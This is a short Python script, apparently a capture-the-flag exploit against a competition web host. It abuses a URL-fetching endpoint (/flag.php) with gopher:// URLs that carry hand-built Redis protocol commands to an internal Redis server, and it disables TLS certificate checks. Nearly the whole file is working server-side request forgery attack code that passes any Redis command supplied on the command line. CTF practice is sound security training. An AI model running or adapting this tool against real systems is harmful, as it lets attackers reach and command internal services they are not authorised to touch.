#!/usr/bin/env python3
import sys, ssl, urllib.parse, urllib.request, re

TARGET = "https://eci-2zean9adh9n9jct6jz9y.cloudeci1.ichunqiu.com:443"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def resp(*args):
    out = [b"*%d\r\n" % len(args)]
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out.append(b"$%d\r\n" % len(a) + a + b"\r\n")
    return b"".join(out)


def redis(port, *args, print_reply=True):
    raw = resp(*args)
    gopher = "gopher://127.0.0.1:%d/_%s" % (port, urllib.parse.quote(raw, safe=""))
    data = urllib.parse.urlencode({"url": gopher}).encode()
    req = urllib.request.Request(
        TARGET.rstrip("/") + "/flag.php",
        data=data,
        headers={
            "User-Agent": "qwb2026-pwn",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    try:
        body = urllib.request.urlopen(req, timeout=20, context=CTX).read()
    except Exception as e:
        return "ERR " + str(e)
    marker = b"</code></pre>"
    idx = body.rfind(marker)
    if idx != -1:
        body = body[idx + len(marker):]
    if print_reply:
        print(repr(body[:4000]))
    return body


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 6379
    args = sys.argv[2:]
    redis(port, *args)
